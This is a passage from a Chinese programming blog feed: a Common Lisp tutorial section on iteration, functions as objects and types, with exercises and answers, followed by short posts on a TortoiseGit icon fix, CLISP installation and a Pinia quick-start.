class="number">16</span></span><br><span class="line"><span class="number">5</span> <span class="number">25</span></span><br><span class="line">DONE</span><br></pre></td></tr></table></figure><p>do宏是Common Lisp中最基本的迭代操作符. 就象let,do也会产生变量,它的第一 个自变量是关于变量规格的表. 表中的每个元素具有如下形式: <strong>(variable initial update)</strong></p><p>其中variable是符号,而initial和update是表达式. 一开始每个变量会被赋予相 应的initial的值;在迭代的时候它会被赋予相应的update的值.</p><p>作为对比,这是递归版本的show-squares:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> show-squares (<span class="name">i</span> end)</span><br><span class="line">  (<span class="name">if</span> (<span class="name">&gt;</span> i end)</span><br><span class="line">      &#x27;done</span><br><span class="line">      (<span class="name">progn</span></span><br><span class="line">        (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~A ~A~%&quot;</span> i (<span class="name">*</span> i i))</span><br><span class="line">        (<span class="name">show-squares</span> (<span class="name">+</span> i <span class="number">1</span>) end))))</span><br></pre></td></tr></table></figure><p>此函数中的唯一新面孔是progn. 它接受任意数量的表达式,对它们依次求值,然后返回最后一个的值.</p><p>对一些特殊情况Common Lisp有更简单的迭代操作符. 比如,为了遍历表的所有元素,你更可能用dolist. 这个函数返回表的长度</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">dolist</span> (<span class="name">n</span> &#x27;(<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>))</span><br><span class="line">   (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~% Number: ~d Square: ~d&quot;</span> n (<span class="name">*</span> n n))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">Number: <span class="number">1</span> Square: <span class="number">1</span></span><br><span class="line">Number: <span class="number">2</span> Square: <span class="number">4</span></span><br><span class="line">Number: <span class="number">3</span> Square: <span class="number">9</span></span><br><span class="line">Number: <span class="number">4</span> Square: <span class="number">16</span></span><br><span class="line">Number: <span class="number">5</span> Square: <span class="number">25</span></span><br><span class="line">Number: <span class="number">6</span> Square: <span class="number">36</span></span><br><span class="line">Number: <span class="number">7</span> Square: <span class="number">49</span></span><br><span class="line">Number: <span class="number">8</span> Square: <span class="number">64</span></span><br><span class="line">Number: <span class="number">9</span> Square: <span class="number">81</span></span><br></pre></td></tr></table></figure><h1 id="函数作为对象"><a href="#函数作为对象" class="headerlink" title="函数作为对象"></a>函数作为对象</h1><p>函数在Lisp中就象符号,字符串和表一样,是常规的对象. 如果我们给function一个函数的名字,它会返回相关的对象. 就象quote,function是特殊操作符,因此我们不必引用自变量:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">function</span> +)</span><br><span class="line">#&lt;Compiled-Function + <span class="number">17</span>BA4E&gt;</span><br></pre></td></tr></table></figure><p>这个模样很奇怪的返回值是函数在典型Common Lisp实现中可能的显示方式. 到目前为止我们涉及到的对象具有这样的特点:Lisp显示它们与我们输入的模样是一致的. 此惯例不适合函数.</p><p>我们用’作为quote的简记法,我们可以用#’作为function的简写:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="comment">#&#x27;+</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&lt;Compiled-Function + 17BA4E&gt;</span></span><br></pre></td></tr></table></figure><p>此简记法叫做sharp-quote. 就象其它的对象,函数可以作为自变量传递.<br>一个接受函数作为自变量的是 apply. 它接受一个函数和一列自变量,并返回那个函数应用这些自变量后的结果:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">apply</span> #&#x27;+ &#x27;(<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>))</span><br><span class="line"><span class="number">6</span></span><br><span class="line">&gt; (<span class="name">+</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>)</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><p>它能接受任意数目的自变量,只要最后一个是表:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">apply</span> #&#x27;+ <span class="number">1</span> <span class="number">2</span> &#x27;(<span class="number">3</span> <span class="number">4</span> <span class="number">5</span>))</span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><p>函数funcall能做同样的事情,不过它不需要把自变量放在表中:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">funcall</span> #&#x27;+ <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>)</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><p>宏defun创造一个函数并给它一个名字. 但函数并不是必须需要名字,因此我们也不需要用defun来定义它们. 就象其它Lisp对象一样,我们可以直接引用函数.<br>为了直接引用一个整数,我们用一列数字;为了直接引用函数,我们用所谓的 lambda表达式.<br>一个lambda表达式是包含以下元素的表:符号lambda,一列参数, 然后是零个或多个表达式组成的函数体. 这个lambda表达式代表接受两个数并返回它们之和的函数:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">lambda</span> (<span class="name">x</span> y) </span><br><span class="line">  (<span class="name">+</span> x y))</span><br></pre></td></tr></table></figure><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ((<span class="name">lambda</span> (<span class="name">x</span>) (<span class="name">+</span> x <span class="number">100</span>)) <span class="number">1</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure><p>而通过在lamda表达式之前附加#’,我们得到了相应的函数:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">funcall</span> #&#x27;(lambda (x) (+ x <span class="number">100</span>))</span><br><span class="line">           <span class="number">1</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure><blockquote><p>lambda是什么? lambda表达式中的lambda不是操作符. 它仅是个符号. 它在早期的Lisp方言里有一种作用:函数的内部形态是表,因此区别函数和普通表的唯一办法是查看第一个元素是否是符号lambda. 在Common Lisp中你能把函数表示为表,但它们在内部被表示成独特的函数对象. 因此lambda不再是必需的. 如果要求把函数<br><code>(lambda (x) (+ x 100))</code><br>表示成<br><code>((x) (+ x 100))</code><br>也没有什么矛盾,但Lisp程序员已经习惯了函数以符号lambda开始,因此Common Lisp保留了此传统.</p></blockquote><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><p>Lisp用非同寻常的灵活手段来处理类型. 在许多语言中,变量是有类型的,你得指 定变量的类型才能使用它. 在Common Lisp中,值具有类型,而不是变量.</p><p>你可以假想每个对象都贴了指明它的类型的标签. 这种方法叫做显示类型. 你不需要去声明变量的类型,因为变量可以装任何类型的对象.</p><p>数<code>27</code>是类型fixnum,integer,rational,real,number,atom,和t,以一般 性的增长为序. (Numeric类型在第9章中讨论)<strong>类型t是所有类型的超集,因此任何对象都是类型t</strong>.</p><p>函数typep接受一个对象和一个类型说明符,如果对象是那种类型就返回真:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">typep</span> <span class="number">27</span> &#x27;integer)</span><br><span class="line">T</span><br></pre></td></tr></table></figure><p>总结</p><ol><li>Lisp是交互式语言. 如果你在顶层输入表达式,Lisp会打印它的值.</li><li>Lisp程序由表达式组成. 表达式可以是一个原子,或是一个表, 表的第一 个元素是操作符,后面跟着零个或多个自变量. 前缀表达式意味着操作符可接受任意多个自变量.</li><li>Common Lisp函数调用的求值规则:从左至右对自变量求值,然后把这些值传给由操作符表示的函数. quote有它自己的求值规则:它原封不动地返回自变量.</li><li>除了通常的数据类型,Lisp还有符号和表. 由于Lisp程序由表组成,很容易编写能写程序的程序.</li><li>三个基本的表处理函数是cons:它创造一个表;car:它返回表的头一个元素; cdr:它返回第一个元素之后的所有东西.</li><li>在Common Lisp里, t表示真,nil表示伪. 在逻辑上下文中,除了nil之外的任何东西都算作真. 基本的条件语句是if. and和or操作符就象条件语句.</li><li>Lisp主要是由函数构成的. 你可用defun来定义新的函数.</li><li>调用自己的函数是递归的. 递归函数应该被认为是一个过程而不是机器.</li><li>括号不是个问题,因为程序员利用缩进来读写Lisp.</li><li>基本的i&#x2F;o函数是read:它包含了完整的Lisp语法分析器,和format:它基于模板产生输出.</li><li>你可以用let创造新的局部变量,用defparameter创造新的全局变量.</li><li>赋值操作符是setf. 它的第一个自变量可以是表达式.</li><li>函数化编程法–它意味着避免副作用–是Lisp中占支配地位的范例.</li><li>基本的循环操作符是do.</li><li>函数是常规的Lisp对象. 它们可以作为自变量被传递,可以表示成lambda 表达式.</li><li>值有类型,而变量没有类型</li></ol><p>练习</p><ol><li>解释以下表达式求值后的结果:<ul><li>a. (+ (- 5 1) (+ 3 7))</li><li>b. (list 1 (+ 2 3))</li></ul></li><li>给出3种不同的能返回(a b c)的cons表达式</li><li>用car和cdr定义一个函数,它返回表的第四个元素.</li><li>定义一个函数,它接受两个自变量,返回两个中较大的一个.</li><li>这些函数做了什么? <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> enigma (<span class="name">x</span>)</span><br><span class="line">     (<span class="name">and</span> (<span class="name">not</span> (<span class="name">null</span> x))</span><br><span class="line">          (<span class="name">or</span> (<span class="name">null</span> (<span class="name">car</span> x))</span><br><span class="line">              (<span class="name">enigma</span> (<span class="name">cdr</span> x)))))</span><br></pre></td></tr></table></figure> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> mystery (<span class="name">x</span> y)</span><br><span class="line">     (<span class="name">if</span> (<span class="name">null</span> y)</span><br><span class="line">         <span class="literal">nil</span></span><br><span class="line">         (<span class="name">if</span> (<span class="name">eql</span> (<span class="name">car</span> y) x)</span><br><span class="line">             <span class="number">0</span></span><br><span class="line">             (<span class="name">let</span> ((<span class="name">z</span> (<span class="name">mystery</span> x (<span class="name">cdr</span> y))))</span><br><span class="line">               (<span class="name">and</span> z (<span class="name">+</span> z <span class="number">1</span>))))))</span><br></pre></td></tr></table></figure></li><li>在下面的表达式中,x处应该是什么可得出结果? <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">car</span> (<span class="name">x</span> (<span class="name">cdr</span> &#x27;(a (b c) d))))</span><br><span class="line">B</span><br></pre></td></tr></table></figure> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">x</span> <span class="number">13</span> (<span class="name">/</span> <span class="number">1</span> <span class="number">0</span>))</span><br><span class="line">   <span class="number">13</span></span><br></pre></td></tr></table></figure> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (<span class="name">x</span> #&#x27;list <span class="number">1</span> <span class="literal">nil</span>)</span><br><span class="line">  (<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li><li>只用本章介绍的操作符,定义一个函数,它接受一个表作为自变量,并返回t 如果表的元素中至少有一个类型是表.</li><li>给出函数的迭代和递归版本:它<ul><li>a. 接受一个正整数,并打印这么多数目的点.</li><li>b. 接受一个表,返回符号a在表中出现的次数.</li></ul></li><li>一位朋友想写一个函数,它返回表中所有非nil元素之和. 他写了此函数的 两个版本, 但没有一个能正确工作. 请指出错误在哪里,并给出正确的版本: <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> summit (<span class="name">lst</span>)</span><br><span class="line">     (<span class="name">remove</span> <span class="literal">nil</span> lst)</span><br><span class="line">     (<span class="name">apply</span> #&#x27;+ lst))</span><br></pre></td></tr></table></figure> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> summit (<span class="name">lst</span>)</span><br><span class="line">     (<span class="name">let</span> ((<span class="name">x</span> (<span class="name">car</span> lst)))</span><br><span class="line">       (<span class="name">if</span> (<span class="name">null</span> x)</span><br><span class="line">           (<span class="name">summit</span> (<span class="name">cdr</span> lst))</span><br><span class="line">           (<span class="name">+</span> x (<span class="name">summit</span> (<span class="name">cdr</span> lst))))))</span><br></pre></td></tr></table></figure></li></ol><p>答案<br>1.<br>    - 14<br>    - (1 5)<br>1.<br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">cons</span> &#x27;a (<span class="name">cons</span> &#x27;b (<span class="name">cons</span> &#x27;c <span class="literal">nil</span>)))</span><br><span class="line">(<span class="name">cons</span> &#x27;a &#x27;(b c))</span><br><span class="line">(<span class="name">cons</span> &#x27;a (<span class="name">cons</span> &#x27;b &#x27;(c)))</span><br></pre></td></tr></table></figure><br>1.<br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> getForth (<span class="name">lst</span>)</span><br><span class="line">  (<span class="name">car</span> (<span class="name">cdr</span> (<span class="name">cdr</span> (<span class="name">cdr</span> lst)))))</span><br><span class="line"></span><br><span class="line">(<span class="name">defun</span> getForth (<span class="name">lst</span> n)</span><br><span class="line">    (<span class="name">let</span> ((<span class="name">result</span> lst)) </span><br><span class="line">        (<span class="name">do</span> ((<span class="name">i</span> <span class="number">2</span> (<span class="name">+</span> i <span class="number">1</span>)))</span><br><span class="line">            ((<span class="name">&gt;</span> i n) &#x27;done)</span><br><span class="line">            (<span class="name">setf</span> result (<span class="name">cdr</span> result))    </span><br><span class="line">        )</span><br><span class="line">        (<span class="name">car</span> result)</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">(<span class="name">getFour</span> &#x27;(<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">11</span>) <span class="number">5</span>)</span><br></pre></td></tr></table></figure><br>1.<br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> getMax (<span class="name">a</span> b)</span><br><span class="line">    (<span class="name">if</span> (<span class="name">&gt;</span> a b)</span><br><span class="line">        (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~A&quot;</span> a)</span><br><span class="line">        (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~A&quot;</span> b)</span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">(<span class="name">getMax</span> <span class="number">1</span> <span class="number">3</span>)</span><br></pre></td></tr></table></figure><br>1.<br>    - 判断 x 列表中是否有 nil 元素<br>    - 查找 x 在列表 y 中的下标，如果没有则为 nil<br>1.<br>    - car<br>    - or<br>    - or ‘(1) 或 apply<br>1.<br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">defun</span> checkList (<span class="name">x</span>)</span><br><span class="line">    (<span class="name">and</span>  x</span><br><span class="line">          (<span class="name">or</span>  (<span class="name">listp</span> (<span class="name">car</span> x))</span><br><span class="line">                (<span class="name">checkList</span> (<span class="name">cdr</span> x)))))</span><br><span class="line"></span><br><span class="line">(<span class="name">defun</span> checkList (<span class="name">x</span>)</span><br><span class="line">    (<span class="name">if</span> (<span class="name">null</span> x)</span><br><span class="line">        <span class="literal">nil</span></span><br><span class="line">        (<span class="name">if</span> (<span class="name">listp</span> (<span class="name">car</span> x))</span><br><span class="line">            <span class="literal">t</span></span><br><span class="line">            (<span class="name">checkList</span> (<span class="name">cdr</span> x)))))</span><br><span class="line"></span><br><span class="line"><span class="comment">; (checkList &#x27;(1 2)) // nil</span></span><br><span class="line"><span class="comment">; (checkList &#x27;(1 2 &#x27;(1))) // T</span></span><br></pre></td></tr></table></figure><br>1.<br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 接受一个正整数,并打印这么多数目的点---递归</span></span><br><span class="line">(<span class="name">defun</span> print-point (<span class="name">x</span>)</span><br><span class="line">    (<span class="name">if</span> (<span class="name">=</span> <span class="number">0</span> x)</span><br><span class="line">        <span class="literal">nil</span></span><br><span class="line">        (<span class="name">progn</span> (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~%.&quot;</span>)</span><br><span class="line">            (<span class="name">print-point</span> (<span class="name">-</span> x <span class="number">1</span>)))))</span><br><span class="line"></span><br><span class="line">&gt; (<span class="name">print-point</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure><br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 接受一个正整数,并打印这么多数目的点---迭代</span></span><br><span class="line">(<span class="name">defun</span> print-point (<span class="name">x</span>)</span><br><span class="line">    (<span class="name">do</span> ((<span class="name">i</span> <span class="number">0</span> (<span class="name">+</span> i <span class="number">1</span>)))</span><br><span class="line">        ((<span class="name">=</span> i x) &#x27;done)</span><br><span class="line">        (<span class="name">format</span> <span class="literal">t</span> <span class="string">&quot;~%.&quot;</span>)))</span><br><span class="line"></span><br><span class="line">&gt; (<span class="name">print-point</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure><br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 接受一个列表，并返回 a 在列表里所出现的次数--递归</span></span><br><span class="line">(<span class="name">defun</span> count-a (<span class="name">lst</span>)</span><br><span class="line">    (<span class="name">if</span> (<span class="name">null</span> lst)</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">        (<span class="name">+</span> (<span class="name">if</span> (<span class="name">eql</span> &#x27;a (<span class="name">car</span> lst)) <span class="number">1</span> <span class="number">0</span>)</span><br><span class="line">            (<span class="name">count-a</span> (<span class="name">cdr</span> lst)))))</span><br><span class="line"></span><br><span class="line">&gt; (<span class="name">count-a</span> &#x27;(a a a <span class="number">1</span> <span class="number">3</span> <span class="number">4</span> a))</span><br></pre></td></tr></table></figure><br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 接受一个列表，并返回 a 在列表里所出现的次数--迭代</span></span><br><span class="line">(<span class="name">defun</span> count-a (<span class="name">lst</span>)</span><br><span class="line">    (<span class="name">let</span> ((<span class="name">count</span> <span class="number">0</span>))</span><br><span class="line">        (<span class="name">dolist</span> (<span class="name">n</span> lst)</span><br><span class="line">            (<span class="name">setf</span> count</span><br><span class="line">                (<span class="name">+</span> (<span class="name">if</span> (<span class="name">eql</span> &#x27;a n) <span class="number">1</span> <span class="number">0</span>)</span><br><span class="line">                    count)))</span><br><span class="line">        count))</span><br><span class="line">    </span><br><span class="line">(<span class="name">count-a</span> &#x27;(a a a a <span class="number">1</span> <span class="number">23</span>))</span><br></pre></td></tr></table></figure><br>1.<br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 因为 remove 并不会改变 lst 本身</span></span><br><span class="line">(<span class="name">defun</span> summit (<span class="name">lst</span>)</span><br><span class="line">    (<span class="name">setf</span> nlst (<span class="name">remove</span> <span class="literal">nil</span> lst))</span><br><span class="line">        (<span class="name">apply</span> #&#x27;+ nlst))</span><br></pre></td></tr></table></figure><br> <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 因为递归没有边界退出分支</span></span><br><span class="line">(<span class="name">defun</span> summit (<span class="name">lst</span>)</span><br><span class="line">    (<span class="name">if</span>  (<span class="name">null</span> lst)</span><br><span class="line">          <span class="number">0</span></span><br><span class="line">          (<span class="name">let</span> ((<span class="name">x</span> (<span class="name">car</span> lst)))</span><br><span class="line">                (<span class="name">if</span>  (<span class="name">null</span> x)</span><br><span class="line">                    (<span class="name">summit</span> (<span class="name">cdr</span> lst))</span><br><span class="line">                    (<span class="name">+</span> x (<span class="name">summit</span> (<span class="name">cdr</span> lst)))))))</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Lisp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Lisp 之根源</title>
      <link href="/Blog/2022/04/24/lisp/Lisp%E4%B9%8B%E6%A0%B9%E6%BA%90/index/"/>
      <url>/Blog/2022/04/24/lisp/Lisp%E4%B9%8B%E6%A0%B9%E6%BA%90/index/</url>
      
        <content type="html"><![CDATA[<p><a href="http://daiyuwen.freeshell.org/gb/rol/roots_of_lisp.html">http://daiyuwen.freeshell.org/gb/rol/roots_of_lisp.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Lisp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 11 icons for tortoise git</title>
      <link href="/Blog/2022/04/24/essay/windows-11-icons-for-tortoise-git/index/"/>
      <url>/Blog/2022/04/24/essay/windows-11-icons-for-tortoise-git/index/</url>
      
        <content type="html"><![CDATA[<ul><li><p>solution：</p></li><li><p>Wrapping with “” all tortoise keys under HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers</p></li><li><p>解决方案：</p></li><li><p>给所有的 tortoise 相关的字段加上 “”，</p></li><li><p>如：Tortoise1Normal &#x3D;&gt; “Tortoise1Normal”</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Common Lisp 安装</title>
      <link href="/Blog/2022/04/13/lisp/CommonLisp%E5%AE%89%E8%A3%85/index/"/>
      <url>/Blog/2022/04/13/lisp/CommonLisp%E5%AE%89%E8%A3%85/index/</url>
      
        <content type="html"><![CDATA[<p><a href="https://sourceforge.net/projects/clisp/">进入官网下载</a></p><p><img src="/Blog/2022/04/13/lisp/CommonLisp%E5%AE%89%E8%A3%85/index/img.png"></p><p>挑一个 win32 的下载</p><p>解压，运行</p><p><img src="/Blog/2022/04/13/lisp/CommonLisp%E5%AE%89%E8%A3%85/index/img_1.png"></p><p>但命令行编写代码不太方便，下载一个IDE：<a href="http://www.daansystems.com/lispide/">http://www.daansystems.com/lispide/</a></p><p>安装以后运行，选择刚刚下载的文件</p><p><img src="/Blog/2022/04/13/lisp/CommonLisp%E5%AE%89%E8%A3%85/index/img_2.png"></p><p>现在，可以开始Common Lisp的学习之旅了，比如写第一个函数：</p><p><img src="/Blog/2022/04/13/lisp/CommonLisp%E5%AE%89%E8%A3%85/index/img_3.png"></p><p>全选文字，右键菜单，发送到Lisp执行，就得到了结果9，很方便。</p>]]></content>
      
      
      <categories>
          
          <category> Lisp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>两分钟上手 pinia</title>
      <link href="/Blog/2022/04/11/essay/%E4%B8%A4%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8Bpinia/index/"/>
      <url>/Blog/2022/04/11/essay/%E4%B8%A4%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8Bpinia/index/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://pinia.vuejs.org/">官网</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn <span class="keyword">add </span>pinia</span><br><span class="line"><span class="comment"># or with npm</span></span><br><span class="line">npm <span class="keyword">install </span>pinia</span><br></pre></td></tr></table></figure><h2 id="初始化-Pinia"><a href="#初始化-Pinia" class="headerlink" title="初始化 Pinia"></a>初始化 Pinia</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createPinia &#125; from &#x27;pinia&#x27;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pinia = createPinia()</span><br><span class="line">pinia.<span class="keyword">use</span>(SomePiniaPlugin) <span class="comment">// 给 pinia 装插件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">app</span> = createApp(<span class="keyword">App</span>)</span><br><span class="line"><span class="keyword">app</span>.<span class="keyword">use</span>(pinia)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://pinia.vuejs.org/core-concepts/outside-component-usage.html#single-page-applications">这里需要注意时间顺序：只有在调用 app.use(pinia) 之后才能调用 useXxxStore()</a></p></blockquote><h2 id="使用-Store"><a href="#使用-Store" class="headerlink" title="使用 Store"></a>使用 Store</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>defineStore 接受一个 id，不同数据源的 id 必须是不同的</li><li>不能将 useCounter() 的返回值解构，这会导致数据响应式的丢失</li></ol><h3 id="写法一："><a href="#写法一：" class="headerlink" title="写法一："></a>写法一：</h3><p>更像原先的 vuex</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// src/stores/counter.js</span><br><span class="line">import &#123; defineStore &#125; <span class="keyword">from</span> &#x27;pinia&#x27;</span><br><span class="line"></span><br><span class="line">export <span class="keyword">const</span> useCounterStore = defineStore(&#x27;counterStore&#x27;, &#123;</span><br><span class="line">  <span class="keyword">state</span>: ()=&gt; &#123;</span><br><span class="line">    return &#123;j: <span class="number">0</span>, k: <span class="number">0</span>&#125;</span><br><span 